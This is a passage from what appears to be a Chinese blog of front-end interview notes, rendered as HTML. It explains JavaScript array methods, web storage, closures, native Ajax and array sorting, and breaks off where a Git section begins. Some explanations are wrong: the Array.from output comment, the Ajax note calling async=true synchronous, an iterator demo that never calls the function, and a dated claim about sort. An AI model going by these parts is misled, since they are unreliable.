class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>]<br><br>arr.<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(index, item)<br>&#125;)<br><br><span class=\"hljs-comment\">//指“映射”，方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值</span><br><span class=\"hljs-keyword\">var</span> arr1 = arr.<span class=\"hljs-title function_\">map</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item * <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr1)<br><br><span class=\"hljs-comment\">// “过滤”功能，方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。和filter() 方法类似，jquery中有个 grep()方法也用于数组元素过滤筛选。</span><br><span class=\"hljs-keyword\">var</span> arr2 = arr.<span class=\"hljs-title function_\">filter</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item &gt; <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr2)<br><br><span class=\"hljs-comment\">//判断数组中每一项都是否满足条件，只有所有项都满足条件，才会返回true。</span><br><span class=\"hljs-keyword\">var</span> arr3 = arr.<span class=\"hljs-title function_\">every</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item &gt; <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr3)<br><br><span class=\"hljs-comment\">//判断数组中是否存在满足条件的项，只要有一项满足条件，就会返回true。</span><br><span class=\"hljs-keyword\">var</span> arr4 = arr.<span class=\"hljs-title function_\">some</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item &gt; <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr4)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"reduce-reduceRight\"><a href=\"#reduce-reduceRight\" class=\"headerlink\" title=\"reduce(),reduceRight()\"></a>reduce(),reduceRight()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//归并方法:迭代数组中的所有项，然后生成一个最终返回值。</span><br><span class=\"hljs-comment\">//第一个参数是每一项调用的函数，函数接受四个参数分别是初始值，当前值，索引值，和当前数组</span><br><span class=\"hljs-comment\">//函数需要返回一个值，这个值会在下一次迭代中作为初始值。第二个参数是迭代初始值，参数可选，</span><br><span class=\"hljs-comment\">//如果缺省，初始值为数组第一项，从数组第一个项开始叠加，缺省参数要比正常传值少一次运算。</span><br><span class=\"hljs-comment\">//reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。</span><br><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">8</span>, <span class=\"hljs-number\">9</span>, <span class=\"hljs-number\">10</span>]<br><span class=\"hljs-keyword\">var</span> result = arr.<span class=\"hljs-title function_\">reduce</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">prev, cur, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> prev + cur<br>&#125;)<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(result) <span class=\"hljs-comment\">// 55</span><br></code></pre></td></tr></table></figure>\n\n<p>·ES6新增方法·</p>\n<h5 id=\"Array-from\"><a href=\"#Array-from\" class=\"headerlink\" title=\"Array.from()\"></a>Array.from()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> json = &#123;<br>  <span class=\"hljs-comment\">//必须是数字</span><br>  <span class=\"hljs-string\">&quot;0&quot;</span>: <span class=\"hljs-string\">&quot;zhangsan&quot;</span>,<br>  <span class=\"hljs-string\">&quot;1&quot;</span>: <span class=\"hljs-number\">18</span>,<br>  <span class=\"hljs-attr\">length</span>: <span class=\"hljs-number\">2</span>\t\t\t<span class=\"hljs-comment\">//需要长度</span><br>&#125;<br><br><span class=\"hljs-keyword\">let</span> arr = <span class=\"hljs-title class_\">Array</span>.<span class=\"hljs-title function_\">from</span>(json)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr) <span class=\"hljs-comment\">// []</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"Array-of\"><a href=\"#Array-of\" class=\"headerlink\" title=\"Array.of()\"></a>Array.of()</h5><h3 id=\"6-离线应用和客户端存储\"><a href=\"#6-离线应用和客户端存储\" class=\"headerlink\" title=\"6.离线应用和客户端存储\"></a>6.离线应用和客户端存储</h3><ul>\n<li>离线检测</li>\n</ul>\n<blockquote>\n<p>HTML5定义了一个navigator.online属性，如果为true表示设备能够上网；</p>\n</blockquote>\n<ul>\n<li>应用缓存</li>\n</ul>\n<blockquote>\n<p>H5使用appcache专门为开发离线Web应用设计；</p>\n<p>从浏览器的缓存区划分一块，使用一个描述文件列出需要下载和缓存的资源；</p>\n</blockquote>\n<ul>\n<li><p>数据存储</p>\n<ol>\n<li>​    Cookie</li>\n</ol>\n<blockquote>\n<p>Http Cookie最初在客户端用于存储会话信息。发送回服务器的额外信息可以用于唯一验证客户来自于发送的哪一个请求；</p>\n</blockquote>\n<blockquote>\n<p>限制：</p>\n<p>cookie在性质上是绑定在特定的域名下，当设定一个cookie后，再给创建他的域名发送请求时都会包含这个cookie，这个限制是的cookie中的信息只能让批准的接收者访问；无法被其他域访问；</p>\n<p>构成:</p>\n<p>Cookie由名称，值，域，路径，失效时间，安全标志组成；</p>\n</blockquote>\n<ol start=\"2\">\n<li>Web存储机制</li>\n</ol>\n<ul>\n<li>提供一个cookie之外存储会话的途径；</li>\n<li>提供一种存储大量跨会话的数据机制；</li>\n</ul>\n<blockquote>\n<p>storage类型</p>\n<p>它提供组大的存储空间，有clear（），getItem(name)，setItem（name,value)等；</p>\n<p>只能存储字符串；</p>\n</blockquote>\n<blockquote>\n<p>sessionStorage类型</p>\n<p>它用于存储某个会话的数据，也就是数据保存到浏览器关闭时。</p>\n<p>存储在sessionStorage中的数据可以跨越页面刷新而存在，同时如果浏览器支持，崩溃之后也能使用；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//使用方法存储数据</span><br>sessionStorage.<span class=\"hljs-title function_\">setItem</span>(<span class=\"hljs-string\">&quot;name&quot;</span>,<span class=\"hljs-string\">&quot;Martin&quot;</span>);<br><span class=\"hljs-comment\">//使用属性存储数据</span><br>sessionStorage.<span class=\"hljs-property\">book</span>=<span class=\"hljs-string\">&quot;JS&quot;</span>;<br></code></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>globalStorage类型</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">globalStorage[<span class=\"hljs-string\">&#x27;域名&#x27;</span>].<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br></code></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>localStorage类型</li>\n</ol>\n</li>\n</ul>\n<blockquote>\n<p>localStorage在H5中作为持久保存客户端数据的方案取代了globalStorage；</p>\n<p>与globalStorage不同；</p>\n</blockquote>\n<h3 id=\"7-cookie设置，token如何实现登录\"><a href=\"#7-cookie设置，token如何实现登录\" class=\"headerlink\" title=\"7.cookie设置，token如何实现登录\"></a>7.cookie设置，token如何实现登录</h3><h3 id=\"8-闭包\"><a href=\"#8-闭包\" class=\"headerlink\" title=\"8.闭包\"></a>8.闭包</h3><blockquote>\n<p>如果一个函数访问量此函数的父级或者父级以上的作用域变量，这个函数就是一个闭包；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> a=<span class=\"hljs-number\">1</span>;<br><br><span class=\"hljs-comment\">//匿名立即执行函数，访问了全局变量a;</span><br>(<br>\t<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">test</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(a);<br>    &#125;<br>)()<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//常见的闭包形式：函数嵌套</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">a</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> index=<span class=\"hljs-number\">0</span>;<br>    index=index+<span class=\"hljs-number\">1</span>;<br>    <br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">b</span>(<span class=\"hljs-params\"></span>)&#123;<br>        index=index+<span class=\"hljs-number\">2</span>;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(index);<br>    &#125;<br>    <br>    <span class=\"hljs-keyword\">return</span> b;<br>&#125;<br><br><span class=\"hljs-keyword\">var</span> c=<span class=\"hljs-title function_\">a</span>();\t\t\t<span class=\"hljs-comment\">//index=0+1; 将函数a赋值给全局变量c时，a会执行一次，局部变量index变为0+1，返回函数b；此时全局变量C为闭包函数b的引用；</span><br><span class=\"hljs-title function_\">c</span>();\t\t\t\t<span class=\"hljs-comment\">//index=0+1+2 //第一次执行c时，闭包函数b第一次执行；</span><br><span class=\"hljs-title function_\">c</span>();\t\t\t\t<span class=\"hljs-comment\">//index=0+1+2+2 //第二次执行c时，闭包函数b第二次执行；</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"特点：\"><a href=\"#特点：\" class=\"headerlink\" title=\"特点：\"></a>特点：</h5><ul>\n<li>被闭包函数访问的父级以上函数的局部变量会一致存在于内存中，不会被JS的垃圾回收机制回收；</li>\n<li>闭包函数u实现了对其他函数内部变量的访问；</li>\n</ul>\n<h5 id=\"JS垃圾回收机制：\"><a href=\"#JS垃圾回收机制：\" class=\"headerlink\" title=\"JS垃圾回收机制：\"></a>JS垃圾回收机制：</h5><ul>\n<li>如果一个对象不再被引用，这个对象会被GC回收；</li>\n<li>如果两个对象相互引用，而不再被第三者所引用，那么这两个对象都会被收回；</li>\n</ul>\n<h5 id=\"闭包的用途：\"><a href=\"#闭包的用途：\" class=\"headerlink\" title=\"闭包的用途：\"></a>闭包的用途：</h5><ul>\n<li>访问函数内部的变量；</li>\n<li>让变量始终保持在内存中；</li>\n</ul>\n<h5 id=\"应用场景：\"><a href=\"#应用场景：\" class=\"headerlink\" title=\"应用场景：\"></a>应用场景：</h5><ul>\n<li>模拟面向对象的代码风格</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name</span>)&#123;<br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Say</span>(<span class=\"hljs-params\">content</span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name+<span class=\"hljs-string\">&quot;:&quot;</span>+content);<br>    &#125;<br>    <br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title class_\">Say</span>;<br>&#125;<br><br>a=<span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;martin&quot;</span>);<br>b=<span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;jacy&quot;</span>);<br><span class=\"hljs-title function_\">a</span>(<span class=\"hljs-string\">&quot;What are u doing ?&quot;</span>);<br><span class=\"hljs-title function_\">b</span>(<span class=\"hljs-string\">&quot;Nothing&quot;</span>);<br><span class=\"hljs-title function_\">a</span>(<span class=\"hljs-string\">&quot;Hang out with me ?&quot;</span>);<br><span class=\"hljs-title function_\">b</span>(<span class=\"hljs-string\">&quot;To there?&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用<code>setTimeout</code>支持传参(通过闭包实现setTimeout第一个函数传参)</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">func</span>(<span class=\"hljs-params\">param</span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(param);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-keyword\">var</span> f1=<span class=\"hljs-title function_\">func</span>(<span class=\"hljs-number\">1</span>);<br><span class=\"hljs-built_in\">setTimeout</span>(f1,<span class=\"hljs-number\">1000</span>);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>封装私有变量：通过闭包定义能访问私有函数和私有变量的共有函数</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> counter=(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> privateCounter=<span class=\"hljs-number\">0</span>;   <span class=\"hljs-comment\">//私有变量</span><br><br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">change</span>(<span class=\"hljs-params\">val</span>)&#123;<br>        privateCounter+=val;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">return</span> &#123;<br>        <span class=\"hljs-attr\">increment</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">change</span>(<span class=\"hljs-number\">1</span>);<br>        &#125;,<br>        <span class=\"hljs-attr\">decrement</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">change</span>(-<span class=\"hljs-number\">1</span>);<br>        &#125;,<br>        <span class=\"hljs-attr\">value</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-keyword\">return</span> privateCounter;<br>        &#125;<br>    &#125;;<br>&#125;)();<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">value</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">value</span>());<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>模拟块作用域</li>\n</ul>\n<p><img src=\"https://img-blog.csdnimg.cn/764a7d4d2f244f3dbb50fa59da6105eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyd6ZizMzk=,size_15,color_FFFFFF,t_70,g_se,x_16\" alt=\"在这里插入图片描述\"></p>\n<blockquote>\n<p>onclick绑定的function中没有变量i，解析引擎会寻找父级作用域，最终找到全局变量i；for循环结束的时，i的值已经变成了4；所以此时任何onclick点击都会弹出4；</p>\n<p>也可使用let i=0;来解决；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> elements=<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">&#x27;li&#x27;</span>);<br><span class=\"hljs-keyword\">var</span> length=elements.<span class=\"hljs-property\">length</span>;<br><br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;i&lt;length;i++)&#123;<br>    elements[i].<span class=\"hljs-property\">onclick</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">num</span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(num);<br>        &#125;<br>    &#125;(i);           <span class=\"hljs-comment\">//通过匿名闭包，把每次的i保存到一个变量中实现了效果</span><br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>实现迭代器</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">setup</span>(<span class=\"hljs-params\">x</span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> x[i++];<br>    &#125;;<br>&#125;<br><span class=\"hljs-keyword\">var</span> next=<span class=\"hljs-title function_\">setup</span>([<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(next);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(next);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(next);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"闭包优点：\"><a href=\"#闭包优点：\" class=\"headerlink\" title=\"闭包优点：\"></a>闭包优点：</h5><ul>\n<li>减少全局变量的定义，避免全局变量污染；</li>\n<li>能够读取函数内部的变量；</li>\n<li>内存中维护一个变量，用作缓存；</li>\n</ul>\n<h5 id=\"闭包缺点：\"><a href=\"#闭包缺点：\" class=\"headerlink\" title=\"闭包缺点：\"></a>闭包缺点：</h5><ul>\n<li>造成内存泄漏，闭包会使函数中的变量一致保存在内存中，内存消耗极大；</li>\n</ul>\n<p>解决方法：使用完毕以后设置为null；</p>\n<ul>\n<li>闭包可能在父函数外部，改变父函数内部的值；</li>\n<li>由于闭包设计跨作用域访问，会导致性能损失；</li>\n</ul>\n<p>解决方法：通过跨作用域变量存储在局部变量中，直接访问局部变量来减轻对执行素的的影响；</p>\n<h3 id=\"9-如何实现原生ajax？\"><a href=\"#9-如何实现原生ajax？\" class=\"headerlink\" title=\"9.如何实现原生ajax？\"></a>9.如何实现原生ajax？</h3><blockquote>\n<p>Ajax是异步的JS和XML，是一种在无需重新加载整个网页的情况下，更新部分网页的技术；</p>\n</blockquote>\n<ul>\n<li>创建XMLHttpRequest对象；</li>\n</ul>\n<blockquote>\n<p>老版本的浏览器用的ActiveX对象；</p>\n<p>现代浏览器使用XMLHttpRequest对象；</p>\n</blockquote>\n<ul>\n<li>向服务器发送请求；</li>\n</ul>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs oxygene\">open(<span class=\"hljs-keyword\">method</span>,<span class=\"hljs-title function_\">url</span>,<span class=\"hljs-title function_\">async</span>)\t\t//请求类型，<span class=\"hljs-title function_\">url</span>位置，<span class=\"hljs-title function_\">true</span>同步<br><span class=\"hljs-title function_\">send</span>（<span class=\"hljs-title function_\">string</span>）\t\t\t//仅用于<span class=\"hljs-title function_\">POST</span>；<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>服务器响应；</li>\n</ul>\n<blockquote>\n<p>1.responseText   字符串形式的数据响应；</p>\n<p>2.responseXML  XML形式的数据响应；</p>\n</blockquote>\n<ul>\n<li>判断是否成；</li>\n</ul>\n<blockquote>\n<p>1.onreadystatechange    存储函数，每当readystate属性改变时调用；</p>\n<p>2.readyState              存有XMLHttpRequest的状态；0初始化，1连接建立，2请求已接受，3请求处理中，4请求已完成；</p>\n<p>3.status            200 ok   404 Page not found;</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//原生Ajax</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">oriAjax</span>(<span class=\"hljs-params\">url,</span>)&#123;<br>    <span class=\"hljs-comment\">//判断浏览器版本</span><br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">XMLHttpRequest</span>)&#123;<br>        <span class=\"hljs-keyword\">var</span> ajaxRequest=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">XMLHttpRequest</span>();<br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> ajaxRequest=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ActiveXObject</span>(<span class=\"hljs-string\">&quot;Microsoft.XMLHTTP&quot;</span>);<br>    &#125;<br><br>    ajaxRequest.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">&quot;GET&quot;</span>,url,<span class=\"hljs-literal\">true</span>);<br><br>    ajaxRequest.<span class=\"hljs-property\">onreadystatechange</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">if</span>(ajaxRequest.<span class=\"hljs-property\">readyState</span>==<span class=\"hljs-number\">4</span> &amp;&amp; ajaxRequest.<span class=\"hljs-property\">status</span>==<span class=\"hljs-number\">200</span>)&#123;<br>            <span class=\"hljs-comment\">//更新dom结点</span><br>            <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">&quot;myDiv&quot;</span>).<span class=\"hljs-property\">innerHTML</span>=ajaxRequest.<span class=\"hljs-property\">responseText</span>;<br>        &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ajaxRequest.<span class=\"hljs-property\">response</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"10-JS排序算法底层原理？\"><a href=\"#10-JS排序算法底层原理？\" class=\"headerlink\" title=\"10.JS排序算法底层原理？\"></a>10.JS排序算法底层原理？</h3><p>sort（）数组长度小于22使用插入排序，大于22快排；</p>\n<h3 id=\"11-nextTick\"><a href=\"#11-nextTick\" class=\"headerlink\" title=\"11.nextTick\"></a>11.nextTick</h3><h1 id=\"Git相关\"><a href=\"#Git相关\" class=\"headerlink\" title=\"Git相关\"></a>Git相关</h1><p><a href=\"https://worktile.com/kb/ask/20275.html\">https://worktile.com/kb/ask/20275.html</a></p>\n<h3 id=\"1-常见命令流程\"><a href=\"#1-常见命令流程\" class=\"headerlink\" title=\"1.常见命令流程\"></a>1.常见命令流程</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span 